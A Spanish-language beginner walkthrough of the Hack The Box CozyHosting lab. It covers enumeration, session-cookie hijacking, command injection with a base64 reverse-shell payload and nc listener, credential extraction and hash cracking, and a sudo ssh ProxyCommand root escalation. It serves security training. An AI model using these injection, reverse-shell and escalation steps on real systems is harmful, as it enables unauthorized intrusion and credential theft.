# CozyHosting Guia

En este repositorio se busca explicar paso a paso la búsqueda de la bandera. Pensé en crear esto para las personas nuevas en el mundo del hacking ético y que no se sientan tan abrumadas con tantos conceptos.

**Lo primero que haremos es identificar nuestra máquina que querremos atacar, que en este caso es la CozyHosting. Esta tiene la siguiente información:**

- **IP: 10.10.11.230**

## Editar el archivo /etc/hosts

Para comenzar, necesitamos editar nuestro archivo `/etc/hosts` utilizando el siguiente comando:

```
sudo nano /etc/hosts
```

- **`sudo`**: "sudo" es un comando en sistemas Unix y Linux que significa "superusuario do". Permite a un usuario ejecutar un comando con privilegios elevados, generalmente como el superusuario o administrador del sistema. El uso de "sudo" es necesario para editar archivos que requieren permisos de administrador, como el archivo `/etc/hosts`.

- **`nano`**: "nano" es un editor de texto en la línea de comandos. Es una herramienta simple y fácil de usar para editar archivos de texto en la terminal. En este caso, se utiliza para abrir y editar el archivo `/etc/hosts`.

- **`/etc/hosts`**: "/etc/hosts" es la ruta completa al archivo que estás tratando de abrir y editar. Este archivo es importante porque se utiliza para resolver nombres de host a direcciones IP en sistemas Unix y Linux. Cuando tu computadora intenta acceder a un sitio web o un recurso en la red, primero verifica si la dirección IP correspondiente está en este archivo antes de recurrir a un servidor DNS público. Agregar entradas en este archivo te permite personalizar la resolución de nombres en tu sistema local.

![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/856ef6b8-7ca9-41b1-85d2-c73c7b9f8cdd)

**Ya dentro, procedemos a agregar nuestra IP junto con la URL.**

![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/e9507dcf-d020-4aad-95be-1508f01a9262)

*(para guardar con Ctrl+O, Ctrl+X, yes, te preguntará si quieres cambiar el nombre, simplemente dale enter)*


![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/59792084-eb50-4ae9-939a-b4095ad38a13)

*Para comprobar que hicimos todo bien, podemos entrar a http://cozyhosting.htb. en resumen utilizar el comando "sudo nano /etc/hosts" es importante para personalizar la resolución de nombres en tu sistema local y permitirte acceder a máquinas o servicios específicos en entornos de CTF como Hack The Box, donde es común que los nombres de host y direcciones IP se utilicen de manera no convencional.*



## NMAP 

```
nmap -sS -sV -p- 10.10.11.230 -o cozyhosting
```
- **`Identificación de puertos abiertos (-p-)`**:La opción -p- le indica a Nmap que escanee todos los puertos posibles en el rango completo (1-65535). Esto es importante porque, en muchos casos, no sabes qué puertos pueden estar abiertos en la máquina objetivo. Al escanear todos los puertos, te aseguras de no pasar por alto ningún servicio o aplicación que pueda estar en ejecución.

- **`Escaneo de tipo SYN (-sS)`**:El escaneo de tipo SYN es un escaneo sigiloso y menos intrusivo. Envía paquetes SYN a los puertos y espera respuestas. Si recibe una respuesta SYN/ACK, sabe que el puerto está abierto. Si recibe un RST (restablecimiento) en respuesta, el puerto está cerrado. Este tipo de escaneo es útil para determinar la accesibilidad de los puertos sin establecer completamente la conexión, lo que podría dejar rastros en el servidor objetivo.

- **`Detección de servicios y versiones (-sV)`**: La opción -sV le permite a Nmap intentar detectar el servicio que se ejecuta en un puerto y, en algunos casos, incluso la versión específica del software. Esto es útil para identificar qué servicios están en funcionamiento en la máquina objetivo y conocer las vulnerabilidades asociadas a esas versiones específicas.

- **`Generación de un informe de resultados (-o)`**:Al utilizar la opción -o seguida de un nombre de archivo, puedes generar un informe de resultados que contiene los detalles del escaneo. Esto te permite registrar la información que obtuviste y revisarla posteriormente. Además, es útil para documentar tu progreso y compartir información con otros miembros de tu equipo en CTF.

![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/b43b57da-65ea-4b44-8ae8-1c43d3c69ccd)
- **`Resultado(-o)`**:Hacer un escaneo Nmap con las opciones -sS -sV -p- en la dirección IP 10.10.11.230  es mportante en la fase de reconocimiento y enumeración de un CTF (Capture The Flag) en Hack The Box o en cualquier otro entorno de pruebas de penetración.


## Dirsearch 
```
dirsearch -u http://cozyhosting.htb/
```

- **`Deteccion de rutas`**:Esta herramienta se utiliza para buscar posibles rutas y recursos accesibles en un sitio web o servidor web. Aquí te explico por qué es importante utilizar dirsearch en un CTF de Hack The Box o en cualquier escenario de pruebas de penetración. Con poner la url del objetivo, ya podremos acceder a sus posibles rutas.

- - **`Si llegaras a tener problemas con el Dirsearch`**: Sigue los siguientes comando si el mismo Kali te niega instalarlo. 
  ```
    git clone https://github.com/maurosoria/dirsearch.git
  ```
  ```
  cd dirsearch
  ```
  ```
  python3 dirsearch.py -u http://cozyhosting.htb/
   ```
- Ya acabo el trabajo de Dirsearch, tendras un resultado como este
![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/4869a22d-4963-4b92-85ed-0fa89b44fc11)}
- Analizamos y encontraremos la siguiente ruta
![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/c3df4a7e-dfb8-4fff-9b24-f90132d437d8)
- A la cual accederemos con la URL que ya teniamos de CozyHosting. Lo que vemos son las sesiones y notamos que la de kanderson es la unica que no dice "no autorizado" y con un cookie que usaremos para engañar al login.
![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/76305964-d943-4ac7-ac57-8df637e72b75)

## Inyección de Cookies
- Ya teniendo la informacion anterior, ya podemos acceder al panel. Esto lo haremos por medio de la inyeccion por cookies.
 **`¿Que es la inyeccion por cookies?**: se refiere a la manipulación maliciosa o indebida de las cookies en una aplicación web. Las cookies son pequeños fragmentos de datos que un servidor web envía al navegador del usuario para almacenar información, como sesiones de usuario, preferencias y estados de autenticación. Cuando las cookies no se manejan adecuadamente, pueden surgir vulnerabilidades que permiten a un atacante inyectar o modificar cookies para obtener un acceso no autorizado o realizar ataques dirigidos.
- Esto eran lo datos que habiamos sacados de http://cozyhosting.htb/actuator/sessions
- Ahora entramos a http://cozyhosting.htb/admin (Esta URL la sacamos del paso anterior)
![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/3c771f04-ef6a-4945-b340-6d6ca45bef60)

- Ingrsamos "inspeccionar codigo" y accedemos a Storange
![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/410902b4-cd14-456c-aa82-9a0b843073bf)
- Remplazamos el valor que tiene , por el que sacamos en el paso anterior, dentro de http://cozyhosting.htb/actuator/sessions y la cookie de Kanderson.
- Ya agregada, refrescamos
![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/e6f834a9-6cee-4b8c-b18f-11f37db5d4f6)
- luego ponemos una usario y contraseña que sea igual por ambos lados. Usario:123 Contraseña:123
- Si hicimos todo bien ahora estamos dentro
![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/94d52f93-8cc9-4b48-841d-19d6952e00f8)


## Burpsuite
- Ya teniendo el paso anterior. Toca escuchar las entradas del sitio web. Usaremos la herramienta de Burpsuite. Esta herramienta nos ayuda a escuchar el trafico que sufre el proxy. Para esto primero necesitamos.
  **`Cambiar el puerto proxy de nuestro navegador`**:La herramineta escucha por medio de la 127.0.0.1 y el puerto 8080, lo que necesitamos hacer es que en nuestro navegador agregaremos estas configuraciones
  ![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/7b2d3b5c-90f8-4eb4-8db1-e471dbce261a)
- Hacemos pruebas. Podemos repetir el paso anterior pero con el Burpsuite activo y ver como funciona. 

## inyección de shell o shell reverso
-Si revisamos la pagina, nos daremos cuenta que hay un apartado de SSH. Lo cual nos puede servir para entrar directamente a su servicio por medio de inyección de shell y Burpsuite
- **`¿Que es la inyección de shell?**:La inyección de comandos se refiere a una vulnerabilidad en la que un atacante puede insertar comandos maliciosos o instrucciones en una entrada de datos que luego se ejecutan en el sistema objetivo a través de una conexión SSH u otro protocolo.
![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/da3f192a-28e4-4ff4-9754-1c15cdcf9e9a)

- Procedemos a escribir 
- Hostname:
 ```127.0.0.1```
-   Usario:
  ```Kanderson```
-   Ya ingresado, revisamos el Burpsuite
![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/a5e664ab-e645-4cb0-9b37-4a4b20dcf342)
- Luego Crt + r para ir el repeater
![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/f4ec75dc-cad5-4aef-814d-7e54783743a2)
- Lo que haremos es un shell a la reversa. Entramos a esta url https://www.revshells.com/ y ponemos la ip que sacamos del paso del ifconfig y ponemos el puerto 4444 que usaremos para entrar al ssh.
![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/f1bf208e-2043-41a4-ae39-bee4d87d78a3)
- Nos aseguramos en que este en Base64
![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/6e5e98e0-058e-439c-bd04-f6fcd84826c2)
- Ya con eso, lo decoficamos en
![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/1a13d55e-5e29-4b85-a7c2-1bd67768bf76)
- Copiamos todo lo que nos dio y lo pegamos entrete esto
- kanderson;echo${IFS}"ELNUMEROQUETEDIO_NOBORRESLASCOMILLAS"|base64${IFS}-d|bash;
- lo pegamos en nuestro Burp
![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/c707a2c2-1b47-4c57-9908-be49db5042ef)
- Le damos en enviar y en nuestra terminal escribimos ```nc -lnvp 4444```
- Si todo salio bien, nos saldra algo asi.
- ![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/b9ba4dc9-de16-48bf-8012-ff862837a6b9)
- Revisamos que hay con ```ls``` y vemos que hay un archivo Jar
*Solo como dato, el puerto puede variar, eso ya depende del gusto de cada usario y de lo que vayan encontrando*


## cloudhosting.jar
- Revisamos el archivo.
- Si intentamos hacerle un unzip, nos lo negara. Asi que haremos lo siguiente

```
python3 -m http.server 9999
```
![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/3e934152-8fd5-4c8d-b735-7909e71dd2ed)
```
wget cozyhosting.htb:9999/cloudhosting-0.0.1.jar
```
![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/31e078e6-9f58-4294-b57e-a797431a6921)
```
unzip cloudhosting-0.0.1.jar
```
![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/513fb33c-ad7a-4da0-8a56-d63ab85ca38f)
- Le damos un Ls para ver que nos extrajo
![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/aaf2119a-0852-46a7-8f8d-090705b21995)
*No se asusten si ven que yo tengo mas archivos, el detalle es que yo lo intente varias veces, pero los importantes son las carpetas*
- Revisamos lo usarios
  ```
  grep -r username
  ```
![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/00229160-234f-4951-b91e-d3fd16346c00)

- De lo encontrado, nos interesa esto
![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/56229dfb-1169-4f7c-8786-8731e916ea79)

```
cat BOOT-INF/classes/application.properties
```
![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/c1841dbe-10dc-4d13-b2a2-49d23b756461)

- Identificamos que "spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting" 
- E igual, algo que nos servira en el siguiente paso
  ![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/e804b562-8cb8-4bb0-a90d-0d4f2354a1d0)
- username=postgres
- password=Vg&nvzAQ7XxR 


## POSTGRESQL
Regresamos al ssh
*Simplemente, apreta ctrl + c para que el puerto 9999 deje de funcionar. Vuelve a poner el nc y envia en burp lo que ya teniamos para volver a iniciar el ssh, por si te confundiste*

![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/44ed47b9-d9f0-487d-980a-8213835dd902)

- accedemos al postgres
  ```
  psql -h localhost -d cozyhosting -U postgres
  ```
- Nos pedira una contraseña, que es la que sacamos en el paso anterior "password=Vg&nvzAQ7XxR"
- ![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/4810f169-f79f-495e-aaa5-943e17817eef)
- revisamos las tablas
```
\l
```
![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/2c29a57a-844a-43dc-9dfc-bc23771bf364)

*salimos con una letra y entener*
Nos sirve, pero no es lo que buscamos.
```
\d
```
![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/9f9f1481-2d16-4ce9-8175-d94ce6a475ef)

- Ya con esto, nos salimos con q + enter y ponemos el siguiente SQL
```
SELECT * FROM users;
```
![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/7bb1b99b-931f-4296-a0db-41b7a68a2c11)

- Esto es lo que buscamos, el unico detalle es que las contraseñas estan hasheadas.

## Hashcat

- **`Deteccion de rutas`**:Hashcat es una potente herramienta de código abierto diseñada para realizar ataques de fuerza bruta y recuperar contraseñas de hashes. Es ampliamente utilizado en el campo de la seguridad informática y la auditoría de seguridad para probar la resistencia de las contraseñas y evaluar la seguridad de sistemas y aplicaciones.
  
- Ahora te recomiendo que descargues la wordlist para la fuerza bruta.
```
git clone https://github.com/danielmiessler/SecLists.git
```
- Buscamos en root la carpeta descargada y entre tantos txt, buscamos el que diga rockyou.txt, ese archivo lo agarramos y lo extreamos en el escritorio. 
- Lo que haremos sera copiar la contraseña hasheada y la pegaremos en el siguiente hash, quedando algo asi.
```
echo '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm' >hashes
```
-Luego
```
hashcat -m 3200 hashes --wordlist /home/kali/Desktop/rockyou.txt --force
```

![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/0334ed88-e849-4515-baef-53f0332a916c)

- Ya que haya acabado, le pedimos que nos muestre
```
hashcat -m 3200 hashes --wordlist /home/kali/Desktop/rockyou.txt --force --show

```
![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/3f6c9749-8fe9-4423-8dc4-01b10b538490)

- Tenemos que la contraseña es "manchesterunited"
  
- Ahora nos falta saber el usario, para eso simplemente indagamos en el SSH.
- regremos a la tabla, no salimos de la con q + enter.
- para salirnos del usario actual, escribimos
```
\q
```
-Luego, nos vamos a home. Pues esa carpeta no la hemos revisado
```
cd /home
```
- Aplicamos un ls
![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/b0f1ed1c-8fc0-43c5-8e4e-09e4f3850efd)
- y tenemos que el usario es josh
- usario:josh contraseña:manchesterunited

## Parte final

- Nos basamos de una estructura comun de ssh para acceder. Sabemos que la ip de la maquina que atacamos es 10.10.11.230, con eso en mente escribimos
```
ssh josh@10.10.11.230

```

![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/fa81870d-09ea-46cd-92ce-6f3226d16c68)


- ponemos la contraseña encontrada manchesterunited
- y ahora si estamos dentro.
![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/680b8a1b-7464-46e1-ad95-b46b923f758c)
- para finalizar, ya podemos encontrar las banderas.
- con un comando sudo -l, vemos que carpetas hay en la maquina
```
sudo -l

```
![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/2d258608-93f8-4a04-b62b-7589f0aee715)

- metemos el siguiente comando
  ```
  sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
  ```

- Banderas


![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/8851bdf8-2e18-4c2f-bd7e-80e37910aea5)



![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/a0d256da-f3a4-4c78-9160-557c8fe4fb11)



